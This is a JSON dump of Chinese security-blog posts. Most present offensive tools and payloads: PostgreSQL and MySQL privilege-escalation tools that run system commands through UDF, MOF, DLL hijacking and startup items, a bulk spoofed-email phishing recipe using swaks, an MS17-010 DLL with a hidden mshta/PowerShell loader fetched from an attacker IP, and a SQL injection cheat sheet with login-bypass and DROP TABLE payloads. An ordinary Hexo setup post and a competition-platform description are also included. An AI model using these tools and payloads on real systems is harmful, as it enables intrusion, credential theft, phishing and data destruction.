[{"title":"驭风信息安全攻防竞技平台","date":"2018-09-05T17:46:25.000Z","path":"2018/09/06/YuFeng_AWD_Platform/","text":"驭风 ， 一款多样化, 可自定义的 “信息安全攻防竞技平台”（苏安天下信息安全攻防研究室 版权所有）。 后台比赛配置 后台登录 管理员登录web后台配置比赛相关信息 打开平台，根据页面提示进入后台管理页面： 默认账号密码信息如下： 账号：`admin@admin.com账号：123456` 进入后台后主界面如下： 比赛配置点击菜单栏赛队设置，进行比赛队伍配置： 设置完毕如下： 点击菜单栏比赛选项配置，进行比赛选项相关配置： 如下选择比赛靶场环境：（目前有18套靶场环境可选，附专项练习） 如下可以直接进行： 配置每队靶机数量 配置比赛时长 配置每轮flag自动刷新时间间隔 配置好相关参数后，点击提交配置并启动靶机。如此提交配置到服务器，并启动靶机，此时靶机无flag。 靶机启动完毕后，随时可以开始比赛。点击最下方的已提交配置，开始比赛按钮，开始比赛： 靶场相关 靶场统计 附靶场漏洞情况与通关参考文档： 比赛平台开发方向定位为框架式平台，赛方或教职工可自行添加比赛靶场或题目，或专项练习。靶场模板如下： 控制面板后台存在控制面板，可以进行以下操作： 关闭所有靶机 修复异常靶机 重置所有靶机的flag 还原指定队伍靶机 eg: 关闭所有靶机 查看flag面板可以查看每队此回合的flag值： 学员功能队员登录学员通过主页队员登录按钮登录： 登陆后如下： 学员可以在此页面直接看到自己当前的比赛状态如：比分、排名 比赛信息 比赛说明 查看网络拓扑 比赛过程 实例：攻击漏洞靶机，获取flag 提交flag 加固时间无法提交flag： 支持批量提交：123for i in `cat /f.txt|awk 'xxxxxx'`;do curl http://172.20.10.9/commit.php -d $i -m 3;done#post_data:ip=xxx.xxx.xxx.xxx&amp;flag=xxxxxxxxxxxx 实时排行榜 查看实时排行榜 统计分数，包括：各队总分(含防御得分)，防御得分，实时分数变化状态，攻击源，攻击事件发生时间，裁判机检测记录与扣分记录等 反作弊机制 查看违规记录 反作弊机制，可对违规严重的队伍进行一键还原靶机： 演示视频此是旧版，暂未有时间更新新版平台的功能演示视频。","tags":[{"name":"AWD","slug":"AWD","permalink":"http://www.zi0n.cn/tags/AWD/"},{"name":"开发","slug":"开发","permalink":"http://www.zi0n.cn/tags/开发/"}]},{"title":"fuck_postgres","date":"2018-09-03T17:46:25.000Z","path":"2018/09/04/fuck_postgres/","text":"前言PostgreSQL在国外的流行程度不亚于MySQL，简称postgres。比如你kaili linux上的Metasploit数据库服务使用的就是PostgreSQL。 fuck_postgres不是什么黑客攻击工具，他并不是要去fuck什么，只用于便捷地使用PostgreSQL自定义函数来执行系统命令，适用于数据库管理员知道postgres密码却不知道ssh或RDP密码的时候在服务器执行系统命令。 一切攻击都是违法行为，非管理员请不要下载使用。使用此工具的一切违法行为与本人无关。经测试，sqlmap上对于postgres的–os-shell无效，so文件和dll文件也有问题，语句略坑，所以我抽时间写一个，方便各位“管理员”。 sqlmap该模块的写文件语句详见filesystem.py:1234567891011121314151617181920212223242526272829303132333435363738394041424344def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False): wFileSize = os.path.getsize(wFile) content = open(wFile, \"rb\").read() self.oid = randomInt() self.page = 0 self.createSupportTbl(self.fileTblName, self.tblField, \"text\") debugMsg = \"create a new OID for a large object, it implicitly \" debugMsg += \"adds an entry in the large objects system table\" logger.debug(debugMsg) # References: # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid) inject.goStacked(\"SELECT lo_create(%d)\" % self.oid) inject.goStacked(\"DELETE FROM pg_largeobject WHERE loid=%d\" % self.oid) for offset in xrange(0, wFileSize, LOBLKSIZE): fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], \"base64\", False) sqlQueries = self.fileToSqlQueries(fcEncodedList) for sqlQuery in sqlQueries: inject.goStacked(sqlQuery) inject.goStacked(\"INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))\" % (self.oid, self.page, self.tblField, self.fileTblName)) inject.goStacked(\"DELETE FROM %s\" % self.fileTblName) self.page += 1 debugMsg = \"exporting the OID %s file content to \" % fileType debugMsg += \"file '%s'\" % dFile logger.debug(debugMsg) inject.goStacked(\"SELECT lo_export(%d, '%s')\" % (self.oid, dFile), silent=True) written = self.askCheckWrittenFile(wFile, dFile, forceCheck) inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid) return written filesystem.py line65，是将dll文件base64编码解码，整个写入到pg_largeobject的一个page，在linux某些版本一定会报错的。每page容量为4096字节，如果是hex，只能容纳2kb的数据。 工具特点 不限平台，可用于管理windows和linux上的postgres 不限版本，udf有效版本内可自行添加库文件到工具目录 hex+分段写入large obj，无page数据过大问题 。。。 USAGE1234567891011121314usage: fuck_postgres [-h] [-a HOST] [-o PORT] [-u USER] [-p PASSWD] [-d DATABASE] [-e EXECUTE]optional arguments: -h, --help show this help message and exit -a HOST, --host HOST pgsql server ip -o PORT, --port PORT pgsql Port -u USER, --user USER pgsql UserName -p PASSWD, --passwd PASSWD pgsql password -d DATABASE, --database DATABASE pgsql database -e EXECUTE, --execute EXECUTE command for UDF to execute 演示 管理PostgreSQL 9.2.24 running on linux 64： 1./fuck_postgres -a 192.168.0.30 -u postgres -p postgresu -e \"cat /etc/passwd\" 1./fuck_postgres -a 192.168.0.30 -u postgres -p postgres -e \"net user &amp; whoami\" 管理PostgreSQL 8.2.21 running on windows 32： 1fuck_postgres.exe -a 192.168.0.30 -u postgres -p postgres -e \"quser &amp; net user &amp; whoami\" 1fuck_postgres.exe -a 192.168.0.47 -u postgres -p postgres -e \"ls -al\" 已收录的postgres库文件 各版本源码地址：https://www.postgresql.org/ftp/source 以下来自@zcgonvh（https://www.t00ls.net/thread-30179-1-1.html） 我在拜读前辈文章时，叹服前辈对待技术研究的态度。 udf源文件在此(https://github.com/sqlmapproject/udfhack/) 在 linux 编译so文件简单许多，只需要一条命令：1gcc sys_eval.c -shared -fPIC -I$PGSRC/include/server -o /tmp/8.2_x64.so 其中$PGSRC 为 postgres 源码的路径或安装路径。 windows上编写 postgres 的 UDF 需要引用其提供的头文件，在 windows 下这些头文件的位置为： %PGDIR%\\include其中%PGDIR%为 postgres 的安装路径 而需要引用的头文件目录并不仅仅只有这个，以下两个目录也是必须的： 12%PGDIR%\\include\\server%PGDIR%\\include\\server\\port\\win32 这三个路径都需要加到工程的头文件目录列表中。同时，需要将 %PGDIR%\\lib添加至 lib 文件目录列表中。在编译时，必须使用 vs 进行编译，使用 vc6 编译会失败（原因未知）。同时也不能使用 release 模式生成，release 的某个选项会导致编译出的 dll 不能正常使用（vs2008 出现此情况，其余版本未测试）。为了防止对方未安装 vc 运行库，务必将 配置属性-&gt;C/C++-&gt;代码生成 中的 代码生成 选项修改为多线程/MT，以保证在任何情况下均能够正常运行。最后，为了尽可能的减小生成文件体积，需要修改 配置属性-&gt;链接器 中以下几个参数：清单文件-&gt;生成清单，修改为否 调试-&gt;生成调试信息，修改为否优化-&gt;引用，修改为是优化-&gt;启用 COMDAT 折叠，修改为是在 vs2008 下使用以上设置，编译成功。 另：建议将生成的动态链接库文件使用 UPX 进行压缩，这样可以有效地减少文件体积。UPX 的下载地址为：http://upx.sourceforge.net/#downloadupx 欢迎有vs环境的童鞋编译提交新的库文件。 参考鸣谢@zcgonvh @anlfi @bt2312 @Catchermana 下载Download fuck_postgresDownload udf","tags":[{"name":"提权","slug":"提权","permalink":"http://www.zi0n.cn/tags/提权/"},{"name":"数据库","slug":"数据库","permalink":"http://www.zi0n.cn/tags/数据库/"},{"name":"自动化","slug":"自动化","permalink":"http://www.zi0n.cn/tags/自动化/"}]},{"title":"邮件伪造钓鱼","date":"2018-09-03T09:20:25.000Z","path":"2018/09/03/mail_fishing/","text":"swaks是一款常用的邮件伪造工具。 Usage1swaks --data mail.eml --to users@target.com --from info@gov.cn 发送eml模板 邮件模板样例我是从qq邮箱导出的eml。例如：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253X-QQ-FEAT: 7sGdpf7C3fzESHd7oVXe8vTNdg7EJqcGPCMAlsIoeVPqxy1h1KhnkKAYEIvyY +LHEuF4GdIHbwhuL1TYd4ZDDb0iQtWdDrJbPqsudGxCiyfVhhFF+OCKm46jvfE/Wo3CnPj8 l0wVXV7edkw+Xc1dMO4Q3Cf3mZ1ZEJCIhAtVdMEXnk83Qhdw7FysfvmlTSq6eA+S+JR8Ekm lJC87nQUrOjhuzgD6Hu/UPZapyYMryYvT147S4fFlFTn47tqI4vO1DsV2ILMr/pyQpmntt5 cPKbiFERA2255Q08l+cT3n4N/YK+zzf1ly+g==X-QQ-SSF: 000100000000003000000000000000ZX-HAS-ATTACH: noX-QQ-BUSINESS-ORIGIN: 2X-Originating-IP: 8.8.8.8X-QQ-STYLE: X-QQ-mid: webmail279t1535959735t4417861From: \"admin\" &lt;mailadmin@admin.com&gt;To: \"users\" &lt;users@admin.com&gt;Subject: =?gb18030?B?o6jPtc2zzajWqqOp08rP5LTmtKLS0cL6?=Mime-Version: 1.0Content-Type: multipart/alternative; boundary=\"----=_NextPart_5B8CE2B7_0A235E88_6A493CCE\"Content-Transfer-Encoding: 8BitReply-To: mymail@qq.comX-Priority: 3Message-ID: &lt;tencent_2179DC92844959BE85CC290A42D48CF14409@qq.com&gt;X-QQ-MIME: TCMime 1.0 by TencentX-Mailer: QQMail 2.xX-QQ-Mailer: QQMail 2.xThis is a multi-part message in MIME format.------=_NextPart_5B8CE2B7_0A235E88_6A493CCEContent-Type: text/plain; charset=\"gb18030\"Content-Transfer-Encoding: base641/C+tLXE08O7p6O6DQoNCg0KxPq1xNPKz+TS0bOsuf3X7rTztOa0os/e1sajrA0KxPq/ycTczt63qL3TytXQwrXE08q8/qGjDQrOqsHLsdzD4tXi1tbH6b/2o6wNCtT2vNPE+rXE08rP5LTmtKKjrA0Kx+uwtNXVyOfPwrjxyr272Li0o6wNCs+1zbO9q9fUtq+9+NDQwKnI3aGjDQoNCg0KuPHKvaO60NXD+yMjuaS6xSMjye233dakusXC6w0KwP3I56O61cXI/SMjMDAyMDE4IyMzMDIxNzExOTcxMDEwMTIzMzMNCg0KDQrQu9C7xPq1xMXkus+joQ0K08q8/tbQ0MQ=------=_NextPart_5B8CE2B7_0A235E88_6A493CCEContent-Type: text/html; charset=\"gb18030\"Content-Transfer-Encoding: base64PGRpdj48ZGl2PtfwvrS1xNPDu6ejujwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+xPq1xNPKz+TS0bOsuf3X7rTztOa0os/e1sajrDwvZGl2PjxkaXY+xPq/ycTczt63qL3TytXQwrXE08q8/qGjPC9kaXY+PGRpdj7OqsHLsdzD4tXi1tbH6b/2o6w8L2Rpdj48ZGl2PtT2vNPE+rXE08rP5LTmtKKjrDwvZGl2PjxkaXY+x+uwtNXVyOfPwrjxyr272Li0o6w8L2Rpdj48ZGl2Ps+1zbO9q9fUtq+9+NDQwKnI3aGjPC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj648cq9o7rQ1cP7IyO5pLrFIyPJ7bfd1qS6xcLrPC9kaXY+PGRpdj7A/cjno7rVxcj9IyMwMDIwMTgjIzMwMjE3MTE5NzEwMTAxMjMzMzwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+0LvQu8T6tcTF5LrPo6E8L2Rpdj48ZGl2PtPKvP7W0NDEPC9kaXY+PC9kaXY+PGRpdj48YnI+PC9kaXY+------=_NextPart_5B8CE2B7_0A235E88_6A493CCE-- Reply-To: mymail@qq.com是回件地址，可以自定义，from和to这些不必多说。 鱼叉式钓鱼：准备个user.txt是受害邮件集合如： 123456testxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.net 使用上述邮件模板即可。 1for i in `cat users.txt`;do echo $i;swaks --data mail.eml --to $i --from info@freebuf.com &gt;&gt; res.txt;done 效果如下图： 邮件伪造原理当前常用的电子邮件协议有SMTP、POP3、IMAP,默认状态下,分别通过TCP端口25、110和143建立连接。 通俗点说，SMTP是发信用的，POP3，IMAP是收信用的。IMAP比POP3在有些方面要强一点。 简单邮件传输协议（Simple Mail Transfer Protocol，SMTP），它用于发送方的邮件服务器发送报文到接收方邮件服务器。SMTP协议中,允许发件人伪造绝大多数的发件人特征信息。这就导致了可以伪造别人发送邮件。 数据传输过程中，SMTP协议主要是通过以下五个主要命令实现的。 a)Helo：与SMTP服务器处理邮件的进程开始通信。 b)Mail from：邮件发件人的信息，即黑客伪造的发件人地址信息。 c)Rcpt to：邮件接收人得信息，即黑客发送伪造邮件的目的邮箱地址。 d)Data：邮件正文内容。 e)Quit：退出邮件。 其中发件人的信息、邮件正文信息均是在发送过程中人为可控的数据。","tags":[{"name":"社会工程学","slug":"社会工程学","permalink":"http://www.zi0n.cn/tags/社会工程学/"}]},{"title":"custom_command_dll","date":"2018-02-09T12:46:25.000Z","path":"2018/02/09/custom_command_dll/","text":"custom command dll file，usually using in MS17_010。 Usagejust open the file and fill in what you want. eg: run taskmgr.exe add user: run a Trojancreate a Trojan with MSF or Cobalt Strike http://192.168.1.105:8080/test.txt 123456789&lt;script language=\"VBScript\"&gt; Function var_func() Dim var_shell Set var_shell = CreateObject(\"Wscript.Shell\") var_shell.run \"powershell.exe -nop -w hidden -encodedcommand JABzAD0A。。。。。。\", 0, true End Function var_func self.close&lt;/script&gt; set command like mshta http://192.168.1.105:8080/test.txt when you create the dll… then… Downloadcustom_cmd_dll.exe","tags":[{"name":"提权","slug":"提权","permalink":"http://www.zi0n.cn/tags/提权/"},{"name":"神器","slug":"神器","permalink":"http://www.zi0n.cn/tags/神器/"}]},{"title":"build_hexo_blog","date":"2018-02-08T12:46:25.000Z","path":"2018/02/08/build_hexo_blog/","text":"What is Hexo?Hexo is a fast, simple and powerful blog framework. You write posts in Markdown (or other languages) and Hexo generates static files with a beautiful theme in seconds. RequirementsInstalling Hexo is quite easy. However, you do need to have a couple of other things installed first: RequirementsInstalling Hexo is quite easy. However, you do need to have a couple of other things installed first: Node.js Git 12345678sudo npm install -g hexo //install hexomkdir hexo hexo init blog //create a root pathcd blognpm install npm install hexo-deployer-git --save //install hexo git plugingit config --global user.email \"your_email@example.com\" //add git user informationgit config --global user.name \"your-git-username\" login your github and create a New repository named：your-github-username.github.io edit /blog/_config.yml： vim _config.yml： Add the following contents to the configuration file at the end： 1234deploy: type: git repository: https://github.com/username/github-username.github.io.git branch: master config ssh pub key1ssh-keygen -t rsa -C \"your_email@example.com\" 1cat ~/.ssh/id_rsa.pub Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key bind your domainadd a file named CNAME in path /blog/themes/your-theme-name/source1234vim CNAMEiwww.xxx.xxx:x then edit your domail，add a CNAME record @ to github-username.github.io. edit your articleadd a new .md file in dir /blog/source/_posts，the file contents usually like： 1234567891011---title: build_hexo_blogdate: 2018/2/8 20:46:25permalink: build_hexo_blog---......&lt;!-- more --&gt;...... publish your article12hexo g //generate local filehexo d //deploy your file to github upload your image:make sure the following code in your _config.yml file： 1post_asset_folder: true install the plugin:1npm install https://github.com/CodeFalling/hexo-asset-image --save then create a dir with the same name as the permalink of this article, copy your img to this dir. enjoy！！！！","tags":[{"name":"杂项","slug":"杂项","permalink":"http://www.zi0n.cn/tags/杂项/"}]},{"title":"fuck_mysql","date":"2018-02-08T11:46:25.000Z","path":"2018/02/08/fuck_mysql/","text":"README 工具功能如下 自动导出你的backdoor和mof文件， 自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权 导出LPK.dll文件，劫持系统目录提权 写启动项提权 工具仅做方便使用，技术含量几乎没有。 用py脚本写的，也打包成exe了，个人用的还算顺手。 用法：123456789101112131415161718192021222324promote:PythonDemo v5est0r$ python root.py __ _ __ __ ____ ___ _ / _|_ _ ___| | _| \\/ |_ _/ ___| / _ \\| || |_| | | |/ __| |/ / |\\/| | | | \\___ \\| | | | | Author：v5est0r| _| |_| | (__| &lt;| | | | |_| |___) | |_| | |___|_| \\__,_|\\___|_|\\_\\_| |_|\\__, |____/ \\__\\_\\_____| |___/usage: root.py [-h] [-a HOST] [-o PORT] [-u USER] [-p PASSWD] [-e EXECUTE] [-m METHOD]fuckmysqloptional arguments: -h, --help show this help message and exit -a HOST, --host HOST MySQL server ip -o PORT, --port PORT MySQL Port -u USER, --user USER mysql UserName -p PASSWD, --passwd PASSWD mysql password -e EXECUTE, --execute EXECUTE command for UDF to execute -m METHOD, --method METHOD elevate method,eg:udf/mof/lpk/st 我在虚拟机演示打包好的exe远程提权，坛子的老哥们都是明白人，我就不多说了，直接上图： 远程模式默认UDF提权，也可以-m udf指定方式，-e ipconfig指定执行的cmd，默认执行whoami：1root.exe -a 192.168.1.105 -p root -e \"ver&amp;whoami\" -m udf 有时候UDF无效，我们使用LPK.dll劫持： 1root.exe -a 192.168.1.105 -p root -m lpk 验证一下lpk是否加上账户: 有时候UDF和LPK都无效，目标是windows2003，还有机会，可以MOF： 把你的木马的hex复制到同目录的hex.txt就行了，程序会导出木马到指定目录，并用mof执行。 每隔几秒就运行一次木马，有点尴尬，如何停止mof老司机都知道，我就不多说了。 有时候UDF和LPK都无效，那我们只能尝试被动写启动项： 1root.exe -a 192.168.1.105 -p root -m st 可能存在路径编码问题写不成功，你可以根据提示，用本地的MySQL连接上去，执行。 当然还有情况是远程提权，UDF不能创建plugin目录，网上流传的ADS流创建目录我是没有成功过，工具里加了ADS流创建目录的代码，那么我们删掉plugin目录，再远程试试： 如上图，那就不行了，那么这种情况下，如果你有shell，在shell里的本地模式执行，就不一样了。 本地模式：一般来说，php一般权限都是可以创建目录的，此处必须指定主机为localhost或127.0.0.1才会调用本地模式：1root.exe -a localhost -p root -e \"ver&amp;whoami\" -m udf Download fuck_mysql.exe","tags":[{"name":"提权","slug":"提权","permalink":"http://www.zi0n.cn/tags/提权/"},{"name":"数据库","slug":"数据库","permalink":"http://www.zi0n.cn/tags/数据库/"},{"name":"自动化","slug":"自动化","permalink":"http://www.zi0n.cn/tags/自动化/"}]},{"title":"SQL注入速查表","date":"2018-01-03T17:46:25.000Z","path":"2018/01/04/sql-injection-cheatsheet/","text":"本文由Yinzo翻译，转载请保留署名。原文地址：http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell 文档版本：1.4 关于SQL注入速查表现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。 样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要 M: MySQL S: SQL Server P: PostgreSQL O: Oracle +: (大概)其他所有数据库 例子： (MS) 代表 : MySQL 和 SQL Server 等 (M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server 目录 关于SQL注入速查表 语法参考，攻击样例以及注入小技巧 行间注释 使用了行间注释的SQL注入攻击样例 行内注释 使用了行内注释的注入攻击样例 MySQL版本探测攻击样例 堆叠查询(Stacking Queries) 支持堆叠查询的语言/数据库 关于MySQL和PHP 堆叠注入攻击样例 If语句 MySQL的If语句 SQL Server的If语句 使用了If语句的注入攻击样例 整数(Integers)的使用 字符串操作 字符串的串联 没有引号的字符串 使用了16进制的注入攻击样例 字符串异化(Modification)与联系 Union注入 UNION-语言问题处理 绕过登陆界面(SMO+) 绕过检查MD5哈希的登陆界面 绕过MD5哈希检查的例子(MSP) 基于错误(Error Based)-探测字段名 使用HAVING来探测字段名(S) 在SELECT查询中使用ORDER BY探测字段数(MSO+) 数据类型、UNION、之类的 获取字段类型 简单的注入(MSO+) 有用的函数、信息收集、内置程序、大量注入笔记 @@version(MS) 文件插入(Bulk Insert)(S) BCP(S) SQL Server的VBS/WSH(S) 执行系统命令，xp_cmdshell(S) SQL Server中的一些特殊的表(S) SQL Server的其它内置程序(S) 大量MSSQL笔记 使用LIMIT(M)或ORDER(MSO)的注入 关掉SQL Server(S) 在SQL Server 2005中启用xp_cmdshell 探测SQL Server数据库的结构(S) 获取用户定义表 获取字段名 移动记录(Moving records)(S) 快速的脱掉基于错误(Error Based)的SQL Server注入(S) 盲注 关于盲注 实战中的盲注实例 延时盲注 WAITFOR DELAY [time](S) 实例 BENCHMARK()(M) 实例 pg_sleep(seconds)(P) 掩盖痕迹 -sp_password log bypass(S) 注入测试 一些其他的MySQL笔记 MySQL中好用的函数 SQL注入的高级使用 强制SQL Server来得到NTLM哈希 Bulk insert UNC共享文件 (S) 待办事项 / 联系方式 / 帮助 语法参考，攻击样例以及注入小技巧行间注释注释掉查询语句的其余部分行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。 --(SM) DROP sampletable;-- #(M) DROP sampletable;# 使用了行间注释的SQL注入攻击样例 用户名:admin&#39;-- 构成语句:SELECT * FROM members WHERE username = &#39;admin&#39;--&#39; AND password = &#39;password&#39;这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。 行内注释通过不关闭注释注释掉查询语句的其余部分，或者用于绕过过滤，移除空格，混淆，或探测数据库版本。 /*注释内容*/(SM) DROP/*comment*/sampletable DR/**/OP/*绕过过滤*/sampletable SELECT/*替换空格*/password/**/FROM/**/Members /*! MYSQL专属 */ (M) 这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。 SELECT /*!32302 1/0, */ 1 FROM tablename 使用了行内注释的注入攻击样例 ID:10; DROP TABLE members /* 简单地摆脱了处理后续语句的麻烦，同样你可以使用10; DROP TABLE members -- MySQL版本探测攻击样例 SELECT /*!32302 1/0, */ 1 FROM tablename 如果MySQL的版本高于3.23.02，会抛出一个division by 0 error ID:/*!32302 10*/ ID:10 如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果 堆叠查询(Stacking Queries)一句代码之中执行多个查询语句，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用 ;(S) SELECT * FROM members; DROP members-- 结束一个查询并开始一个新的查询 支持堆叠查询的语言/数据库绿色：支持，暗灰色：不支持，浅灰色：未知 关于MySQL和PHP阐明一些问题。 PHP-MySQL不支持堆叠查询，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？ （译者注：MySQL 5.6.20版本下客户端支持堆叠查询） 堆叠注入攻击样例 ID:10;DROP members -- 构成语句：SELECT * FROM products WHERE id = 10; DROP members-- 这在执行完正常查询之后将会执行DROP查询。 If语句根据If语句得到响应。这是盲注(Blind SQL Injection)的关键之一，同样也能简单而准确地进行一些测试。 MySQL的If语句 IF(condition,true-part,false-part)(M) SELECT IF (1=1,&#39;true&#39;,&#39;false&#39;) SQL Server的If语句 IF condition true-part ELSE false-part(S) IF (1=1) SELECT &#39;true&#39; ELSE SELECT &#39;false&#39; 使用了If语句的注入攻击样例 if ((select user) = &#39;sa&#39; OR (select user) = &#39;dbo&#39;) select 1 else select 1/0(S) 如果当前用户不是“sa”或者”dbo”,就会抛出一个divide by zero error。 整数(Integers)的使用对于绕过十分有用，比如magic_quotes() 和其他类似过滤器，甚至是各种WAF。 0xHEXNUMBER(SM) (HEXNUMBER:16进制数） 你能这样使用16进制数： SELECT CHAR(0x66)(S) SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串） SELECT 0x50 + 0x45(M) (现在这是整数了) 字符串操作与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。 字符串的串联 +(S) SELECT login + &#39;-&#39; + password FROM members || (*MO) SELECT login || &#39;-&#39; || password FROM members *关于MySQL的”||”这个仅在ANSI模式下的MySQL执行，其他情况下都会当成’逻辑操作符’并返回一个0。更好的做法是使用CONCAT()函数。 CONCAT(str1, str2, str3, ...)(M) 连接参数里的所有字符串 例：SELECT CONCAT(login, password) FROM members 没有引号的字符串有很多使用字符串的方法，但是这几个方法是一直可用的。使用CHAR()(MS)和CONCAT()(M)来生成没有引号的字符串 0x457578 (M) - 16进制编码的字符串 SELECT 0x457578 这在MySQL中会被当做字符串处理 在MySQL中使用16进制字符串的一个简单方式：SELECT CONCAT(&#39;0x&#39;,HEX(&#39;c:\\\\boot.ini&#39;)) 在MySQL中使用CONCAT()函数：SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M) 这会返回’KLM’ SELECT CHAR(75)+CHAR(76)+CHAR(77) (S) 这会返回’KLM’ 使用了16进制的注入攻击样例 SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M) 这会显示c:\\boot.ini的内容 字符串异化(Modification)与联系 ASCII() (SMP) 返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。 例：SELECT ASCII(&#39;a&#39;) CHAR() (SM) 把整数转换为对应ASCII码的字符 例：SELECT CHAR(64) Union注入通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 这会把news表和members表的内容合并返回。 另一个例子：&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1-- UNION-语言问题处理当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。 使用 COLLATE SQL_Latin1_General_Cp1254_CS_AS(S) 或者其它的什么语句，具体的自己去查SQL Server的文档。 例：SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members Hex()(M) 百试百灵~ 绕过登陆界面(SMO+)SQL注入101式(大概是原文名字吧？),登陆小技巧 admin&#39; -- admin&#39; # admin&#39;/* &#39; or 1=1-- &#39; or 1=1# &#39; or 1=1/* &#39;) or &#39;1&#39;=&#39;1-- &#39;) or (&#39;1&#39;=&#39;1-- …. 以不同的用户登陆 (SM*) &#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1-- *旧版本的MySQL不支持union 绕过检查MD5哈希的登陆界面如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。 绕过MD5哈希检查的例子(MSP) 用户名：admin 密码：1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;,&#39;81dc9bdb52d04dc20036dbd8313ed055 其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234) 基于错误(Error Based)-探测字段名使用HAVING来探测字段名(S) &#39; HAVING 1=1 -- &#39; GROUP BY table.columnfromerror1 HAVING 1=1 -- &#39; GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- …… &#39; GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 -- 直到它不再报错，就算搞定了 在SELECT查询中使用ORDER BY探测字段数(MSO+)通过ORDER BY来探测字段数能够加快union注入的速度。 ORDER BY 1-- ORDER BY 2-- …… ORDER BY N-- 一直到它报错为止，最后一个成功的数字就是字段数。 数据类型、UNION、之类的提示： 经常给UNION配上ALL使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct) 如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。 在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强 盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL） 获取字段类型 &#39; union select sum(columntofind) from users-- (S) Microsoft OLE DB Provider for ODBC Drivers error &apos;80040e07&apos; [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 如果没有返回错误说明字段是数字类型 同样的，你可以使用CAST()和CONVERT() SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL-- 11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –- 没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。 11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –- 没报错 – 第一个字段是integer类型。 11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 -- 报错 – 第二个字段不是integer类型 11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –- 没报错 – 第二个字段是string类型。 11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –- 报错 – 第三个字段不是integer …… Microsoft OLE DB Provider for SQL Server error &apos;80040e07&apos; Explicit conversion from data type int to image is not allowed. 你在遇到union错误之前会先遇到convert()错误，所以先使用convert()再用union 简单的注入(MSO+)&#39;; insert into users values( 1, &#39;hax0r&#39;, &#39;coolpass&#39;, 9 )/* 有用的函数、信息收集、内置程序、大量注入笔记@@version(MS)数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。 INSERT INTO members(id, user, pass) VALUES(1, &#39;&#39;+SUBSTRING(@@version,1,10) ,10) 文件插入(Bulk Insert)(S)把文件内容插入到表中。如果你不知道应用目录你可以去读取IIS metabase file(仅IIS 